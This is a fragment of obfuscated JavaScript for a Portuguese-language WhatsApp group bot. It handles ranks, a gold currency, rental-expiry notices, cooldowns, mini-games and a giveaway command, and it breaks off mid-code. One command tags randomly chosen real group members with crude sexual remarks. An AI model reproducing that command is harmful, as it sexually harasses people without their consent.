                var _0x25c9a7 = countMessage[_0x462c63].numbers[_0x3bd884].messages;
              } catch {
                var _0x25c9a7 = 0;
              }
              if (_0x25c9a7 >= 0 && _0x25c9a7 < 20) {
                var _0x5c8446 = "Aspirante";
                var _0x47871c = 0;
              }
              ;
              if (_0x25c9a7 >= 20 && _0x25c9a7 < 50) {
                var _0x5c8446 = "Recruta";
                var _0x47871c = 1;
              }
              ;
              if (_0x25c9a7 >= 50 && _0x25c9a7 < 100) {
                var _0x5c8446 = "Soldado";
                var _0x47871c = 2;
              }
              ;
              if (_0x25c9a7 >= 100 && _0x25c9a7 < 200) {
                var _0x5c8446 = "Cabo";
                var _0x47871c = 3;
              }
              ;
              if (_0x25c9a7 >= 200 && _0x25c9a7 < 300) {
                var _0x5c8446 = "Sargento";
                var _0x47871c = 4;
              }
              ;
              if (_0x25c9a7 >= 300 && _0x25c9a7 < 400) {
                var _0x5c8446 = "Sargento I";
                var _0x47871c = 5;
              }
              ;
              if (_0x25c9a7 >= 400 && _0x25c9a7 < 500) {
                var _0x5c8446 = "Sargento II";
                var _0x47871c = 6;
              }
              ;
              if (_0x25c9a7 >= 500 && _0x25c9a7 < 600) {
                var _0x5c8446 = "Sargento III";
                var _0x47871c = 7;
              }
              ;
              if (_0x25c9a7 >= 600 && _0x25c9a7 < 700) {
                var _0x5c8446 = "Sargento IV";
                var _0x47871c = 8;
              }
              ;
              if (_0x25c9a7 >= 700 && _0x25c9a7 < 800) {
                var _0x5c8446 = "Sargento V";
                var _0x47871c = 9;
              }
              ;
              if (_0x25c9a7 >= 800 && _0x25c9a7 < 900) {
                var _0x5c8446 = "Sargento VI";
                var _0x47871c = 10;
              }
              ;
              if (_0x25c9a7 >= 900 && _0x25c9a7 < 1000) {
                var _0x5c8446 = "Sargento VII";
                var _0x47871c = 11;
              }
              ;
              if (_0x25c9a7 >= 1000 && _0x25c9a7 < 1100) {
                var _0x5c8446 = "Sargento VII";
                var _0x47871c = 12;
              }
              ;
              if (_0x25c9a7 >= 1100 && _0x25c9a7 < 1200) {
                var _0x5c8446 = "Sargento VIII";
                var _0x47871c = 13;
              }
              ;
              if (_0x25c9a7 >= 1200 && _0x25c9a7 < 1500) {
                var _0x5c8446 = "Sargento IX";
                var _0x47871c = 14;
              }
              ;
              if (_0x25c9a7 >= 1500 && _0x25c9a7 < 2000) {
                var _0x5c8446 = "Sargento X";
                var _0x47871c = 15;
              }
              ;
              if (_0x25c9a7 >= 2000 && _0x25c9a7 < 2500) {
                var _0x5c8446 = "Tenente I";
                var _0x47871c = 16;
              }
              ;
              if (_0x25c9a7 >= 2500 && _0x25c9a7 < 2600) {
                var _0x5c8446 = "Tenente II";
                var _0x47871c = 17;
              }
              ;
              if (_0x25c9a7 >= 2600 && _0x25c9a7 < 2700) {
                var _0x5c8446 = "Tenente III";
                var _0x47871c = 18;
              }
              ;
              if (_0x25c9a7 >= 2700 && _0x25c9a7 < 2800) {
                var _0x5c8446 = "Tenente III";
                var _0x47871c = 19;
              }
              ;
              if (_0x25c9a7 >= 2800 && _0x25c9a7 < 2900) {
                var _0x5c8446 = "Tenente IV";
                var _0x47871c = 20;
              }
              ;
              if (_0x25c9a7 >= 2900 && _0x25c9a7 < 3000) {
                var _0x5c8446 = "Tenente V";
                var _0x47871c = 21;
              }
              ;
              if (_0x25c9a7 >= 3000 && _0x25c9a7 < 3200) {
                var _0x5c8446 = "Capitão I";
                var _0x47871c = 22;
              }
              ;
              if (_0x25c9a7 >= 3200 && _0x25c9a7 < 3400) {
                var _0x5c8446 = "Capitão II";
                var _0x47871c = 23;
              }
              ;
              if (_0x25c9a7 >= 3400 && _0x25c9a7 < 3800) {
                var _0x5c8446 = "Capitão III";
                var _0x47871c = 24;
              }
              ;
              if (_0x25c9a7 >= 3800 && _0x25c9a7 < 4000) {
                var _0x5c8446 = "Capitão IV";
                var _0x47871c = 25;
              }
              ;
              if (_0x25c9a7 >= 4000 && _0x25c9a7 < 5000) {
                var _0x5c8446 = "Capitão V";
                var _0x47871c = 26;
              }
              ;
              if (_0x25c9a7 >= 5000 && _0x25c9a7 < 5500) {
                var _0x5c8446 = "Major I";
                var _0x47871c = 27;
              }
              ;
              if (_0x25c9a7 >= 5500 && _0x25c9a7 < 6000) {
                var _0x5c8446 = "Major II";
                var _0x47871c = 28;
              }
              ;
              if (_0x25c9a7 >= 6000 && _0x25c9a7 < 6500) {
                var _0x5c8446 = "Major III";
                var _0x47871c = 29;
              }
              ;
              if (_0x25c9a7 >= 6500 && _0x25c9a7 < 8000) {
                var _0x5c8446 = "Major IV";
                var _0x47871c = 30;
              }
              ;
              if (_0x25c9a7 >= 8000 && _0x25c9a7 < 9000) {
                var _0x5c8446 = "Major V";
                var _0x47871c = 31;
              }
              ;
              if (_0x25c9a7 >= 9000 && _0x25c9a7 < 10000) {
                var _0x5c8446 = "Tenente C I";
                var _0x47871c = 32;
              }
              ;
              if (_0x25c9a7 >= 10000 && _0x25c9a7 < 11000) {
                var _0x5c8446 = "Tenente C II";
                var _0x47871c = 33;
              }
              ;
              if (_0x25c9a7 >= 11000 && _0x25c9a7 < 12000) {
                var _0x5c8446 = "Tenente C II";
                var _0x47871c = 34;
              }
              ;
              if (_0x25c9a7 >= 12000 && _0x25c9a7 < 13000) {
                var _0x5c8446 = "Tenente C III";
                var _0x47871c = 35;
              }
              ;
              if (_0x25c9a7 >= 13000 && _0x25c9a7 < 15000) {
                var _0x5c8446 = "Tenente C IV";
                var _0x47871c = 36;
              }
              ;
              if (_0x25c9a7 >= 15000 && _0x25c9a7 < 17000) {
                var _0x5c8446 = "Tenente C V";
                var _0x47871c = 37;
              }
              ;
              if (_0x25c9a7 >= 17000 && _0x25c9a7 < 20000) {
                var _0x5c8446 = "Coronel I";
                var _0x47871c = 38;
              }
              ;
              if (_0x25c9a7 >= 20000 && _0x25c9a7 < 23000) {
                var _0x5c8446 = "Coronel II";
                var _0x47871c = 39;
              }
              ;
              if (_0x25c9a7 >= 25000 && _0x25c9a7 < 28000) {
                var _0x5c8446 = "Coronel III";
                var _0x47871c = 40;
              }
              ;
              if (_0x25c9a7 >= 28000 && _0x25c9a7 < 30000) {
                var _0x5c8446 = "Coronel IV";
                var _0x47871c = 41;
              }
              ;
              if (_0x25c9a7 >= 30000 && _0x25c9a7 < 35000) {
                var _0x5c8446 = "Coronel V";
                var _0x47871c = 42;
              }
              if (_0x40dfc7 && !_0x42baf4) {
                switch (_0x25c9a7) {
                  case 20:
                  case 50:
                  case 100:
                  case 200:
                  case 300:
                  case 400:
                  case 500:
                  case 600:
                  case 700:
                  case 800:
                  case 900:
                  case 1000:
                  case 1100:
                  case 1200:
                  case 1500:
                  case 2000:
                  case 2500:
                  case 2600:
                  case 2700:
                  case 2800:
                  case 2900:
                  case 3000:
                  case 3200:
                  case 3400:
                  case 3600:
                  case 3800:
                  case 4000:
                  case 5000:
                  case 5500:
                  case 6000:
                  case 6500:
                  case 8000:
                  case 9000:
                  case 10000:
                  case 11000:
                  case 12000:
                  case 13000:
                  case 15000:
                  case 17000:
                  case 20000:
                  case 23000:
                  case 25000:
                  case 28000:
                  case 30000:
                    async function _0x4f8090() {
                      _0x5196be.sendMessage(_0x346d97, {
                        'text': "\n￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣\n✥ Parabéns: @" + _0x246d48.split('@')[0] + "\n\nVocê upou de level e também de patente por completar " + _0x25c9a7 + " mensagens e recebeu 25 Golds, veja as informações abaixo..\n\n✧ Patente: " + _0x5c8446 + "\n\n✧ Level: " + _0x47871c + "\n\n￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣",
                        'mentions': [_0x246d48]
                      });
                      if (JSON.stringify(rggold).includes(_0x346d97)) {
                        var _0x53e0ad = rggold.map(_0x3a509f => _0x3a509f.grupo).indexOf(_0x346d97);
                        if (JSON.stringify(rggold[_0x53e0ad].usus).includes(_0x246d48)) {
                          var _0xc018ef = rggold[_0x53e0ad].usus.map(_0x263930 => _0x263930.id).indexOf(_0x246d48);
                          rggold[_0x53e0ad].usus[_0xc018ef].Golds += 25;
                          _0x1564b4(rggold);
                        }
                      }
                    }
                    _0x4f8090();
                    break;
                }
              }
            }
            if (_0x89cd51) {
              if (!JSON.stringify(patentes).includes(_0x346d97)) {
                const _0x264528 = {
                  id: _0x246d48,
                  level_usu: _0x47871c,
                  patente_usu: _0x5c8446
                };
                const _0x5bba3a = {
                  grupoID: _0x346d97,
                  usus: [_0x264528]
                };
                patentes.push(_0x5bba3a);
                fs.writeFileSync("./DADOS/grupos/patentes.json", JSON.stringify(patentes));
              }
              var _0xb3787a = patentes.map(_0x251bab => _0x251bab.grupoID).indexOf(_0x346d97);
              if (!JSON.stringify(patentes[_0xb3787a].usus).includes(_0x246d48)) {
                const _0x22aa8a = {
                  id: _0x246d48,
                  level_usu: _0x47871c,
                  patente_usu: _0x5c8446
                };
                patentes[_0xb3787a].usus.push(_0x22aa8a);
                fs.writeFileSync("./DADOS/grupos/patentes.json", JSON.stringify(patentes));
              }
              var _0x3037a3 = patentes[_0xb3787a].usus.map(_0x465346 => _0x465346.id).indexOf(_0x246d48);
              if (patentes[_0xb3787a].usus[_0x3037a3].patente_usu != _0x5c8446) {
                patentes[_0xb3787a].usus[_0x3037a3].patente_usu = _0x5c8446;
                fs.writeFileSync("./DADOS/grupos/patentes.json", JSON.stringify(patentes));
              }
              if (patentes[_0xb3787a].usus[_0x3037a3].level_usu != _0x47871c) {
                patentes[_0xb3787a].usus[_0x3037a3].level_usu = _0x47871c;
                fs.writeFileSync("./DADOS/grupos/patentes.json", JSON.stringify(patentes));
              }
            }
          }
          async function _0xc7d21a() {
            var _0x1990f2 = countMessage[countMessage.map(_0x5017f6 => _0x5017f6.groupId).indexOf(_0x346d97)].numbers;
            CNT1 = [];
            for (_0x3194f3 of groupMembers) {
              CNT1.push(_0x3194f3.id);
            }
            CNT = [];
            for (_0x3194f3 of _0x1990f2) {
              if (!CNT1.includes(_0x3194f3.id)) {
                CNT.push(_0x3194f3);
              }
            }
            for (_0x3194f3 of CNT) {
              _0x1990f2.splice(_0x1990f2.map(_0x18afb9 => _0x18afb9.id).indexOf(_0x3194f3.id), 1);
            }
            fs.writeFileSync("./DADOS/grupos/countmsg.json", JSON.stringify(countMessage, null, 2));
            if (_0x33d21e) {
              let _0x5627b6 = [];
              rggold[_0x3befc0].usus.map(_0x21bbd9 => {
                if (!groupMembers.map(_0x515cd2 => _0x515cd2.id).includes(_0x21bbd9.id)) {
                  _0x5627b6.push(_0x21bbd9.id);
                }
              });
              _0x5627b6.forEach(function (_0xcd480) {
                rggold[_0x3befc0].usus.splice(rggold[_0x3befc0].usus.findIndex(_0x1d1769 => _0x1d1769.id === _0xcd480), 1);
              });
              _0x1564b4(rggold);
            }
          }
          let _0x3c923e = new Set();
          try {
            if (!_0x3c923e.has(_0x346d97) && (nescessario?.["rg_aluguelGB"] || _0x89cd51 && _0x326cbd[0]?.["rg_aluguel"]) && !_0xf59944 && !rg_aluguel.some(_0x486885 => _0x486885.id_gp == _0x346d97) && _0x1d6d9e) {
              _0x3c923e.add(_0x346d97);
              const _0x3479bf = {
                text: "Olá @" + _0x45b1c6 + ", o aluguel do (Grupo/Usuário) não está registrado. Fale com o meu dono para registrar ou renovar: https://wa.me/" + numerodono_ofc,
                mentions: [_0x246d48]
              };
              const _0x1f8ee1 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x3479bf, _0x1f8ee1);
              setTimeout(() => _0x3c923e["delete"](_0x346d97), 10000);
              return;
            }
            if ((nescessario?.["rg_aluguelGB"] || _0x89cd51 && _0x326cbd[0]?.["rg_aluguel"]) && !_0xf59944 && _0x267d4b !== "verificar_aluguel") {
              let _0x28a3dc = Math.floor(Date.now() / 1000);
              let _0x276430 = [];
              rg_aluguel.forEach(_0xcb322d => {
                if (_0xcb322d.id_gp !== _0x346d97) {
                  return;
                }
                let _0xc50751 = Math.floor(_0xcb322d.vencimento);
                let _0x17ebcb = _0x28a3dc - _0xc50751;
                if (_0x28a3dc > _0xc50751) {
                  if (!_0xcb322d.enviado) {
                    const _0x4ee021 = {
                      text: "Grupo: " + _0xcb322d.nome_ + "\nID: " + _0xcb322d.id_gp + "\n\nExpirou o aluguel."
                    };
                    _0x276430.push(_0x5196be.sendMessage(numerodono_ofc + "@s.whatsapp.net", _0x4ee021));
                    const _0x4c8771 = {
                      text: "*Olá ADMs Do Grupo*" + lermais + "\n\n*O Aluguel Deste Grupo Venceu. Aguardando 2 dias para renovação. Caso não renove, estarei saindo do grupo. Entre em contato com:* wa.me/" + numerodono_ofc,
                      mentions: _0x1c25a7
                    };
                    _0x276430.push(_0x5196be.sendMessage(_0x346d97, _0x4c8771));
                    delay(100);
                    const _0x23fb6d = {
                      text: "Grupo: " + _0xcb322d.nome_ + "\nID: " + _0xcb322d.id_gp + "\n\nPassou os dois dias e não foi renovado. Realizei a ação de sair do grupo e apagar o grupo do registro de aluguéis."
                    };
                    _0x276430.push(_0x5196be.sendMessage(numerodono_ofc + "@s.whatsapp.net", _0x23fb6d));
                    _0xcb322d.enviado = true;
                    _0xcb322d.notificacaoTipo = "expiracao";
                  }
                  if (_0x17ebcb >= 172800 && _0x89cd51) {
                    const _0x591dfb = {
                      text: "*Olá, já passou 2 dias do vencimento do aluguel e não foi renovado. Estarei saindo do grupo. Para renovar, entre em contato com o dono:* wa.me/" + numerodono_ofc,
                      mentions: _0x1c25a7
                    };
                    _0x276430.push(_0x5196be.sendMessage(_0x346d97, _0x591dfb));
                    const _0x5c06a2 = {
                      text: "Grupo: " + _0xcb322d.nome_ + "\nID: " + _0xcb322d.id_gp + "\n\nPassou Os Dois Dias E Não Foi Renovado, E Realizei A Ação De Sair Do Grupo E Apaga O Grupo Do Registro De Alugueis."
                    };
                    _0x276430.push(_0x5196be.sendMessage(numerodono_ofc + "@s.whatsapp.net", _0x5c06a2));
                    setTimeout(async () => {
                      rg_aluguel56 = rg_aluguel.filter(_0x5c3d43 => _0x5c3d43.id_gp !== _0x346d97);
                      fs.writeFileSync("./DADOS/json/rg_aluguel.json", JSON.stringify(rg_aluguel56, null, 2));
                      await _0x5196be.groupLeave(_0x346d97);
                    }, 5000);
                    return;
                  }
                  if (_0x1d6d9e) {
                    const _0x5b0bc6 = {
                      text: "Oi @" + _0x45b1c6 + ", seu aluguel expirou. Por favor, renove-o. Entre em contato com: wa.me/" + numerodono_ofc,
                      mentions: [_0x246d48]
                    };
                    const _0xe913d6 = {
                      quoted: _0xd2050d
                    };
                    _0x276430.push(_0x5196be.sendMessage(_0x346d97, _0x5b0bc6, _0xe913d6));
                    return;
                  }
                } else {
                  if (_0xc50751 - _0x28a3dc <= 86400 && !_0xcb322d.notificado) {
                    const _0x402342 = {
                      text: "Grupo: " + _0xcb322d.nome_ + "\nID: " + _0xcb322d.id_gp + "\n\nO aluguel deste grupo expira amanhã."
                    };
                    _0x276430.push(_0x5196be.sendMessage(numerodono_ofc + "@s.whatsapp.net", _0x402342));
                    const _0x144f1e = {
                      text: "*Aviso: O aluguel deste grupo expira amanhã!*",
                      mentions: _0x1c25a7
                    };
                    _0x276430.push(_0x5196be.sendMessage(_0x346d97, _0x144f1e));
                    _0xcb322d.notificado = true;
                    _0xcb322d.notificacaoTipo = "aviso_iminente";
                  }
                }
              });
              if (_0x276430.length) {
                fs.writeFileSync("./DADOS/json/rg_aluguel.json", JSON.stringify(rg_aluguel, null, 2));
                await Promise.all(_0x276430);
              }
            }
          } catch (_0x3de3d8) {
            console.error("Erro ao verificar expiração do aluguel: " + _0x3de3d8);
          }
          if (_0x89cd51 && _0x1d6d9e && !_0x3f2f63 && !_0xf59944 && !_0x33286a && _0x326cbd[0]?.["Limitar_CMD"]) {
            var _0x2ec3c7 = Math.floor(Date.now() / 1000);
            var _0xad0c74 = Limit_CMD.findIndex(_0x4fcdce => _0x4fcdce.idgp === _0x346d97);
            var _0x480344 = Limit_CMD[_0xad0c74]?.["ids"]["findIndex"](_0x2290c6 => _0x2290c6.id === _0x246d48);
            if (!JSON.stringify(Limit_CMD).includes(_0x346d97) || _0xad0c74 < 0 && _0x480344 < 0) {
              const _0x11c444 = {
                id: _0x246d48,
                tempo: _0x2ec3c7
              };
              const _0x4a33da = {
                idgp: _0x346d97,
                ids: [_0x11c444]
              };
              Limit_CMD.push(_0x4a33da);
              fs.writeFileSync("./DADOS/datab/grupos/limitarcmd.json", JSON.stringify(Limit_CMD, null, 2));
            } else {
              if (_0xad0c74 >= 0 && _0x480344 < 0) {
                const _0x30091b = {
                  id: _0x246d48,
                  tempo: _0x2ec3c7
                };
                Limit_CMD[_0xad0c74].ids.push(_0x30091b);
                fs.writeFileSync("./DADOS/datab/grupos/limitarcmd.json", JSON.stringify(Limit_CMD, null, 2));
              }
            }
            if (_0xad0c74 >= 0 && _0x480344 >= 0) {
              var _0x2b5c0e = Limit_CMD[_0xad0c74].ids[_0x480344].tempo;
              var _0x9c7385 = _0x2ec3c7 - _0x2b5c0e;
              var _0x8313ff = parseInt(_0x326cbd[0]?.["Limit_tempo"]) || 60;
              if (_0x9c7385 < _0x8313ff) {
                return _0x50740b(nescessario.TEMPO_DE_CMD.replaceAll("#tempocmd#", kyun(_0x9c7385)).replaceAll("#tempo#", _0x8313ff));
              } else {
                Limit_CMD[_0xad0c74].ids[_0x480344].tempo = _0x2ec3c7;
                fs.writeFileSync("./DADOS/datab/grupos/limitarcmd.json", JSON.stringify(Limit_CMD, null, 2));
              }
            }
          }
          if (_0x33d21e && !_0xd2050d.key.fromMe && _0x89cd51 && _0x42a9f2 && _0x1d6d9e && _0x326cbd[0]?.["comandos_gold"]?.["length"] >= 1 && _0x326cbd[0].comandos_gold.some(_0x384357 => _0x384357.comando === _0x267d4b)) {
            var _0x3216c0 = _0x326cbd[0].comandos_gold[_0x326cbd[0].comandos_gold.findIndex(_0x206190 => _0x206190.comando === _0x267d4b)];
            if (_0x3de59a.RS(_0x246d48, "Golds") < _0x3216c0.gold) {
              return _0x50740b("Você não tem Golds suficiente para utilizar este comando..");
            }
            setTimeout(() => {
              _0x3de59a.RM(_0x246d48, _0x3216c0.gold);
              _0x5dcc57(_0x33c0c0 + " @" + _0x45b1c6 + " após o uso do comando " + _0x3216c0.comando + " foi consumido " + _0x3216c0.gold + " Golds dos seus > " + (parseInt(_0x3de59a.RS(_0x246d48, "Golds")) + parseInt(_0x3216c0.gold)) + " Golds");
            }, 500);
          }
          const _0x1ddd1d = JSON.parse(fs.readFileSync("./DADOS/json/ppt.json"));
          const _0x4c298f = _0x484fbb => {
            let _0x1a4ae0 = false;
            Object.keys(_0x1ddd1d).forEach(_0x38cb10 => {
              if (_0x1ddd1d[_0x38cb10].player1 === _0x484fbb || _0x1ddd1d[_0x38cb10].player2 === _0x484fbb) {
                _0x1a4ae0 = _0x38cb10;
              }
            });
            if (_0x1a4ae0 !== false) {
              return _0x1a4ae0;
            }
          };
          function _0x1eedf2(_0x3fd649, _0x3c85b3, _0x42b17d, _0x256a6d) {
            if (_0x3fd649 == "pedra" && _0x3c85b3 == "papel" || _0x3fd649 == "papel" && _0x3c85b3 == "tesoura" || _0x3fd649 == "tesoura" && _0x3c85b3 == "pedra") {
              var _0x546f21 = "Vitoria para @" + _0x256a6d;
            } else {
              if (_0x3fd649 == "pedra" && _0x3c85b3 == "tesoura" || _0x3fd649 == "papel" && _0x3c85b3 == "pedra" || _0x3fd649 == "tesoura" && _0x3c85b3 == "papel") {
                var _0x546f21 = "Vitoria para @" + _0x42b17d;
              } else {
                if (_0x3fd649 == "pedra" && _0x3c85b3 == "pedra" || _0x3fd649 == "papel" && _0x3c85b3 == "papel" || _0x3fd649 == "tesoura" && _0x3c85b3 == "tesoura") {
                  var _0x546f21 = "Ouve um empate";
                }
              }
            }
            return _0x546f21;
          }
          if (_0x33d21e && _0x326cbd[0].emojigold === true) {
            let _0x4a4b94 = Date.now();
            let _0x50287b = _0x265e03.find(_0xb0cabd => _0xb0cabd.grupo === _0x346d97);
            if (!_0x50287b) {
              let _0x515730 = _0x4d949a[0].emojis;
              let _0x300fef = Object.keys(_0x515730);
              let _0x33cc31 = _0x300fef[Math.floor(Math.random() * _0x300fef.length)];
              const _0x4d53ae = {
                grupo: _0x346d97,
                usuarios: [],
                UsuReset: 0x0,
                Atualizar: false,
                Enviado: false,
                EnviadoRank: false,
                Data: _0x4a4b94,
                Nome: _0x33cc31,
                Emoji: _0x515730[_0x33cc31],
                mentions: []
              };
              _0x50287b = _0x4d53ae;
              _0x265e03.push(_0x50287b);
            } else {
              if (_0x4a4b94 - _0x50287b.Data > 3600000) {
                _0x50287b.Atualizar = true;
                _0x50287b.Data = _0x4a4b94;
                let _0x4925b6 = _0x4d949a[0].emojis;
                let _0x2bb67c = Object.keys(_0x4925b6);
                let _0x4d543f = _0x2bb67c[Math.floor(Math.random() * _0x2bb67c.length)];
                _0x50287b.Nome = _0x4d543f;
                _0x50287b.Emoji = _0x4925b6[_0x4d543f];
                _0x50287b.Enviado = false;
              }
            }
            if (_0x50287b.Atualizar || !_0x50287b.Enviado) {
              fs.writeFileSync("./DADOS/json/messageData.json", JSON.stringify(_0x265e03, null, 2));
              let _0x257786 = _0x46bfa3(_0x346d97);
              if (_0x257786 && !_0x257786.Enviado) {
                _0x257786.Enviado = true;
                _0x257786.Data = Date.now();
                fs.writeFileSync("./DADOS/json/messageData.json", JSON.stringify(_0x265e03, null, 2));
                let _0x13c0da = _0x257786.mentions || [];
                const _0x34b07a = {
                  text: "✧፝͢⃟" + _0x2cd689 + " Emoji Gold ✧͢⃟ᤢ" + _0x2cd689 + "\n\no primeiro que enviar o emoji que representa está palavra:\n\n-> Palavra: " + _0x257786.Nome + "\n\nGanhará 25 Golds\n\nCaso Queira Ser Mencionado Nas Próximas Vezes Utilize: " + _0x141936 + "mencgold",
                  mentions: _0x13c0da
                };
                _0x5196be.sendMessage(_0x346d97, _0x34b07a);
              }
            }
            function _0xa387e9(_0x1906ce) {
              if (!_0x1906ce) {
                return '';
              }
              let _0x198810 = Array.from(_0x1906ce).map(_0x23b4b9 => _0x23b4b9.codePointAt(0));
              let _0x3cdbbc = _0x198810.filter(_0x679a08 => !(_0x679a08 >= 127995 && _0x679a08 <= 127999));
              return String.fromCodePoint(..._0x3cdbbc);
            }
            let _0x111f16 = _0x46bfa3(_0x346d97);
            if (_0x111f16 && _0x111f16.Enviado) {
              let _0x281b0b = _0xa387e9(_0x111f16.Emoji);
              let _0x33b7c9 = _0xa387e9(_0x5725b4);
              if (_0x33b7c9 === _0x281b0b && _0x111f16.Emoji !== null) {
                _0x3de59a.ADD(_0x246d48, 25);
                let _0x278349 = _0x111f16.usuarios.findIndex(_0x320576 => _0x320576.id === _0x246d48);
                if (_0x278349 !== -1) {
                  _0x111f16.usuarios[_0x278349].pontos += 1;
                } else {
                  const _0xc0ddc8 = {
                    id: _0x246d48,
                    pontos: 0x1
                  };
                  _0x111f16.usuarios.push(_0xc0ddc8);
                }
                _0x111f16.Emoji = null;
                fs.writeFileSync("./DADOS/json/messageData.json", JSON.stringify(_0x265e03, null, 2));
                return _0x50740b("Parabéns, você recebeu 25 Golds e ganhou um ponto por acertar o emoji! 🎉");
              }
            }
            function _0x3b9945() {
              _0x265e03.forEach(_0x5cde30 => {
                if (!_0x5cde30.usuarios) {
                  _0x5cde30.usuarios = [];
                }
                if (_0x5cde30.usuarios.length > 0) {
                  let _0xcfbe44 = "🏆 Ranking dos Usuários 🏆\n\n";
                  _0x5cde30.usuarios.sort((_0x4e398d, _0x4aeaad) => _0x4aeaad.pontos - _0x4e398d.pontos);
                  _0x5cde30.usuarios.forEach((_0x3b5bf6, _0x1ed2a2) => {
                    _0xcfbe44 += _0x1ed2a2 + 1 + ". @" + _0x3b5bf6.id.split('@')[0] + " - Pontos: " + _0x3b5bf6.pontos + "\n";
                  });
                  _0xcfbe44 += "\n\nPrimeiro ganhará 50 de gold\nsegundo 30 de gold\nterceiro 15 de gold";
                  _0x5196be.sendMessage(_0x5cde30.grupo, {
                    'text': _0xcfbe44,
                    'mentions': _0x5cde30.usuarios.map(_0xee0c8 => _0xee0c8.id)
                  });
                }
              });
            }
            function _0x25ada5() {
              let _0x4d3317 = Math.floor(Date.now() / 1000);
              let _0x736084 = new Date().toLocaleDateString();
              _0x265e03.forEach(_0x30aef2 => {
                let _0x38dbde = _0x30aef2.UsuReset || 0;
                if (_0x30aef2.grupo === _0x346d97 && _0x4d3317 >= _0x38dbde && _0x30aef2.LastReset !== _0x736084) {
                  _0x3b9945();
                  _0x30aef2.usuarios.sort((_0x2ed6ae, _0x529f82) => _0x529f82.pontos - _0x2ed6ae.pontos);
                  if (_0x30aef2.usuarios.length >= 1) {
                    _0x3de59a.ADD(_0x30aef2.usuarios[0].id, 50);
                  }
                  if (_0x30aef2.usuarios.length >= 2) {
                    _0x3de59a.ADD(_0x30aef2.usuarios[1].id, 30);
                  }
                  if (_0x30aef2.usuarios.length >= 3) {
                    _0x3de59a.ADD(_0x30aef2.usuarios[2].id, 15);
                  }
                  _0x30aef2.LastReset = _0x736084;
                  _0x30aef2.EnviadoRank = true;
                  _0x30aef2.usuarios = [];
                  let _0x282ce4 = new Date();
                  _0x282ce4.setDate(_0x282ce4.getDate() + 1);
                  _0x282ce4.setHours(21, 0, 0, 0);
                  _0x30aef2.UsuReset = Math.floor(_0x282ce4.getTime() / 1000);
                  fs.writeFileSync("./DADOS/json/messageData.json", JSON.stringify(_0x265e03, null, 2));
                }
              });
            }
            _0x25ada5();
          }
          switch (_0x267d4b) {
            case "testepin":
              const _0x54a8c1 = {
                pin: WAMessageKey,
                type: proto.PinInChat.Type,
                time: 0x15180
              };
              _0x5196be.sendMessage(_0x346d97, _0x54a8c1);
              break;
            case "rankbct":
            case "rankbuceta":
            case "rankbucetudas":
              if (!_0x89cd51) {
                return enviar("Só em Grupo");
              }
              if (!_0x5c6233) {
                return _0x50740b(_0x24f408);
              }
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              _0x484933(_0x346d97, '😈');
              let _0x1e3f28 = [];
              let _0x1932a0 = ["Buceta rosinha, parece que menstrua danone! 🫣", "Buceta mó preta, parece o sufaco das minhas primas. 🤐", "Mó bucetão, parece da Elisa Shances. 😈", "Bct lisinha, parece eu sem dinheiro. 🥲", "Deliciosa, porém parece a mata atlântica. 🌼", "Deliciosa e macia. 🥰", "Pior que o correio, só pacote. 😏", "Provoca até nos sonhos. 🤤", "Sonho de qualquer homem. 😜", "Quem é Mia Khalifa perto de você?. 😉", "Se essa é a porta do paraíso, eu queria ser a chave. 😍"];
              let _0x20e348 = "*_Essas são as mais bucetudas 🤤 do grupo:_*\n*╭────────────*";
              for (let _0x467c4d = 0; _0x467c4d < 5; _0x467c4d++) {
                let _0x56c8d8 = groupMembers[Math.floor(Math.random() * groupMembers.length)];
                _0x20e348 += "\n*│* 😈 @" + _0x56c8d8.id.split('@')[0] + "\n*│➥ " + _0x1932a0[Math.floor(Math.random() * _0x1932a0.length)] + '*';
                _0x1e3f28.push(_0x56c8d8.id);
              }
              _0x20e348 += "\n*╰────────────*";
              _0x3b76ab(_0x20e348, "https://telegra.ph/file/165911b460383de91b25f.jpg");
              break;
            case "pay":
              {
                const _0x263515 = {
                  mentionedJid: [_0x246d48]
                };
                const _0x3d2274 = {
                  text: '' + _0x671b4b,
                  contextInfo: _0x263515
                };
                const _0x4681b9 = {
                  extendedTextMessage: _0x3d2274
                };
                const _0x491448 = {
                  currencyCodeIso4217: "BRL",
                  amount1000: "10000",
                  noteMessage: _0x4681b9,
                  amount: {}
                };
                _0x491448.amount.value = "10000";
                _0x491448.amount.offset = 0x3e8;
                _0x491448.amount.currencyCode = "BRL";
                const _0x9eb39f = {
                  requestPaymentMessage: _0x491448
                };
                await _0x5196be.relayMessage(_0x346d97, _0x9eb39f, {
                  'messageId': _0x346d97
                });
              }
              break;
            case "sortreact":
              {
                async function _0x177650() {
                  let _0xc1482c = _0x11e99e.split('/');
                  if (_0xc1482c.length !== 3) {
                    _0x50740b("Formato incorreto. Use: " + (_0x141936 + _0x267d4b) + " prêmio/minutos/ganhadores\nexemplo: " + (_0x141936 + _0x267d4b) + " 2 reais/5m/1");
                    return;
                  }
                  let _0xe8cdc3 = _0xc1482c[0].trim();
                  let _0x276eac = _0xc1482c[1].trim();
                  let _0x6cb76b = parseInt(_0xc1482c[2].trim());
                  if (isNaN(_0x6cb76b) || _0x6cb76b < 1) {
                    _0x50740b("Número de ganhadores inválido. Deve ser um número inteiro positivo.");
                    return;
                  }
                  let _0x11c76d = _0x276eac.match(/^(\d+)(m)?$/);
                  if (!_0x11c76d) {
                    _0x50740b("Formato de tempo inválido. Use minutos (exemplo: 5m ou 5).");
                    return;
                  }
                  let _0x25161a = parseInt(_0x11c76d[1], 10);
                  if (_0x25161a < 1 || _0x25161a > 120) {
                    _0x50740b("Tempo inválido. O tempo deve ser entre 1 e 120 minutos.");
                    return;
                  }
                  let _0x5a818e = _0x25161a * 60;
                  let _0x5758b5 = Math.floor(Date.now() / 1000) + _0x5a818e;
                  const _0x3af106 = {
                    grupos: {}
                  };
                  let _0x3f76d4 = _0x3af106;
                  try {
                    let _0x5404da = fs.readFileSync("./DADOS/json/sortreact.json", "utf8");
                    _0x3f76d4 = JSON.parse(_0x5404da);
                  } catch (_0xd19f0a) {
                    console.warn("Não foi possível ler o arquivo existente. Um novo será criado: " + _0xd19f0a.message);
                  }
                  if (_0x3f76d4.grupos && _0x3f76d4.grupos[_0x346d97]) {
                    return _0x50740b("Já existe um sorteio ativo neste grupo.");
                  }
                  try {
                    let {
